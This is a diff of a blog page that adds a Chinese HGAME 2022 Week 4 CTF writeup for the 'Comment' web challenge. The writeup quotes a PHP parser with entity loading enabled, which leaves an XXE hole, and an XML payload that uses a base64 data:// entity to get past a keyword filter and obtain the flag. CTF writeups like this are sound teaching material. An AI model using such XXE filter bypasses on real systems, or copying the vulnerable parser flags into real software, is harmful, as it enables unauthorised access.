@@ -18,17 +18,17 @@
   <link 
     rel="icon" 
     href="/img/logo.png">
-  <title>寒假总结</title>
+  <title>HGAME 2022 Week4 writeup by pankas</title>
   
     
       <meta 
         property="og:title" 
-        content="寒假总结">
+        content="HGAME 2022 Week4 writeup by pankas">
     
     
       <meta 
         property="og:url" 
-        content="https://pankas.top/2022/02/20/%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/index.html">
+        content="https://pankas.top/2022/02/20/week4-pankas/index.html">
     
     
       <meta 
@@ -57,7 +57,7 @@
         
           <meta 
             property="og:article:tag" 
-            content="随笔">
+            content="CTF HGAME">
         
       
     
@@ -302,11 +302,11 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      寒假总结
+      HGAME 2022 Week4 writeup by pankas
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2022-02-20T06:36:52.000Z">
+    <time datetime="2022-02-19T16:00:00.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
@@ -317,15 +317,15 @@
       <span class="dot"></span>
       
         <a 
-          href="/categories/%E6%97%A5%E5%B8%B8/" 
+          href="/categories/CTF-WP/" 
           class="post-meta-link">
-          日常
+          CTF-WP
         </a>
       
     
     
       <span class="dot"></span>
-      <span>0 字</span>
+      <span>269 字</span>
     
   </div>
   
@@ -340,9 +340,9 @@
         
           
           <a 
-            href="/tags/%E9%9A%8F%E7%AC%94/" 
+            href="/tags/CTF-HGAME/" 
             class="post-meta-link">
-            随笔
+            CTF HGAME
           </a>
         
       </div>
@@ -352,7 +352,50 @@
   <div 
     id="section" 
     class="post-content">
-    <p>！！！</p>
+    <p>最后一周我又摆烂了。    (QAQ)</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h3><p>查看下源码</p>
+<p>关键部分</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">parseXML</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'invalid xml data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$attrs</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$attrs</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'content is empty'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$attrs</span><span class="token operator">-></span><span class="token property">sender</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">waf</span><span class="token punctuation">(</span><span class="token variable">$attrs</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Hacker!'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$attrs</span><span class="token operator">-></span><span class="token property">sender</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/admin/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hgame&#123;xxxxx&#125;'</span><span class="token punctuation">;</span>
+        <span class="token variable">$attrs</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token variable">$attrs</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>结合前端post的请求</p>
+<p><img src="/week4-pankas.assets/image-20220218113336902.png" alt="image-20220218113336902" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/week4-pankas.assets/image-20220218113336902.png" class="lozad post-image"></p>
+<p>这里存在XXE漏洞</p>
+<p>那么要让post的字符串没有<code>admin</code>但是转化后的XML对象的<code>&lt;sender&gt;</code>要为<code>admin</code></p>
+<p>这里waf过滤了很多伪协议，但<code>data://</code>伪协议没有过滤</p>
+<p>所以可以构造payload</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY payload SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,YWRtaW4&#x3D;&quot;&gt; 
+]&gt;
+&lt;comment&gt;&lt;sender&gt;&amp;payload;&lt;&#x2F;sender&gt;&lt;content&gt;flag&lt;&#x2F;content&gt;&lt;&#x2F;comment&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中<code>YWRtaW4=</code>为<code>admin</code>的base64编码，这样检测字符串时没有<code>admin</code>，但实例化xml对象后由于data伪协议<code>&lt;sender&gt;</code>变为了admin，拿到flag</p>
+<p><img src="/week4-pankas.assets/image-20220218114017939.png" alt="image-20220218114017939" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/week4-pankas.assets/image-20220218114017939.png" class="lozad post-image"></p>
 
   </div>
   <div>
@@ -372,8 +415,8 @@
           <span style="font-weight: bold;">文章链接：</span><a 
             target="_blank" 
             rel="nofollow noopener noreferrer" 
-            href="https://pankas.top/2022/02/20/%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/">
-            https://pankas.top/2022/02/20/%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/
+            href="https://pankas.top/2022/02/20/week4-pankas/">
+            https://pankas.top/2022/02/20/week4-pankas/
           </a>
         </p>
         <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
@@ -383,15 +426,29 @@
 </article>
 <div class="nav">
   
+    <div class="nav-item-prev">
+      <a 
+        href="/2022/02/20/week3-pankas/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">HGAME 2022 Week3 writeup by pankas </div>
+          
+        </div>
+      </a>
+    </div>
+  
   
     <div class="nav-item-next">
       <a 
-        href="/2022/02/20/week1-pankas/" 
+        href="/2022/02/20/week2-pankas/" 
         class="nav-link">
         <div>
           <div class="nav-label">下一篇</div>
           
-            <div class="nav-title">HGAME 2022 Week1 writeup by pankas </div>
+            <div class="nav-title">HGAME 2022 Week2 writeup by pankas </div>
           
         </div>
         <i class="iconfont icon-right nav-next-icon"></i>
@@ -409,7 +466,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Comment"><span class="toc-text">Comment</span></a></li></ol></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -457,7 +514,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Comment"><span class="toc-text">Comment</span></a></li></ol></li></ol>
       </div>
     </article>
   
@@ -530,7 +587,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Comment"><span class="toc-text">Comment</span></a></li></ol></li></ol>
     </article>
   
   
